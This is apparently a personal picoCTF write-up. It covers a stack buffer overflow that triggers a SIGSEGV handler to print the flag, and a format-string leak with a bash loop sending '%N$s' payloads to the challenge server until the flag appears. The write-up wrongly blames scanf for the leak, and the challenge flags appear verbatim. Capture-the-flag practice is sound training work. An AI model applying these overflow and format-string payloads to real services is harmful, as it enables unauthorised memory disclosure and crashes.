# buffer overflow 0
Challenge provides a source code from which it's immediately obvious that upon a `SIGSEGV` signal the flag is given out
```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```
...
```c
signal(SIGSEGV, sigsegv_handler); // Set up signal handler
```
Therefore, let's try to enter a REALLY big input in an attempt to stack smash.
```bash
(base) achu@air ~ % nc saturn.picoctf.net 62854 <<< $(printf "Get smashed lol %.0s" {1..69})
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
(base) achu@air ~ % 
```
And we get our flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`.

# format string 0
TBD

# flag leak
In the source code, the unsafe function `scanf` is used
```c
scanf("%127s", story);
```
We can potentially exploit it and make it print values off the stack
```bash
(base) achu@air ~ % nc saturn.picoctf.net 62426
Tell me a story and then I'll tell you one >> %x  
Here's a story - 
ffebb4e0
(base) achu@air ~ % 
```
Automating this to run until we find a hit for string containing `CTF`
```bash
(base) achu@air ~ % i=0; while true; do output="$(echo "%${i}\$s" | nc saturn.picoctf.net 62426 2>/dev/null)"; if echo "$output" | grep -E CTF >/dev/null; then echo "Found at i=$i:"; echo "$output"; break; fi; i=$((i+1)); done

Found at i=24:
Tell me a story and then I'll tell you one >> Here's a story - 
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
(base) achu@air ~ % 
```
Reformat and our correct flag is `picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}`
